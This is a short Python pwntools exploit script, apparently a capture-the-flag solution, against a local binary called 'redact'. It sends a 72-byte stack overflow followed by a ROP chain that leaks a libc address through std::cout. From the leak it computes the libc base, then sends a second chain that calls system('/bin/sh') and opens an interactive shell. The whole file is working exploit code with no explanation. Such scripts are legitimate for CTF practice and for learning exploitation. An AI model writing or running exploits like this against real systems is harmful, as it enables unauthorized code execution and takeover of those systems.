#! /usr/bin/python3

from pwn import *

p = process('./redact')
e = ELF('./redact')
libc = ELF('./libc.so.6')

context.binary = e
context.log_level = 'debug'

pop_rdi = 0x40177b
pop_rsi_r15 = 0x401779
ret = 0x401016

payload = b'A'* 72 + p64(pop_rdi)
payload += p64(e.symbols._ZSt4cout)
payload += p64(pop_rsi_r15)
payload += p64(e.got.__libc_start_main)
payload += p64(1)
payload += p64(e.plt._ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc)
payload += p64(ret)
payload += p64(e.symbols.main)
p.sendlineafter(b'Enter some text: ', b'')
p.sendlineafter(b'Enter a placeholder: ', payload)
# pause()
p.sendlineafter(b'redact: ', b'0')
p.recvline()
libc.address = u64(p.recvuntil(b'Enter', drop=True).ljust(8,b'\x00')) - libc.symbols.__libc_start_main
print(hex(libc.address))

rop_chain = ROP([e,libc],badchars='\n')
rop_chain.system(next(libc.search(b'/bin/sh\0')))
p.sendlineafter(b'placeholder: ', b'A'*72 + rop_chain.chain())
p.sendlineafter(b'redact: ', b'0')

p.interactive()
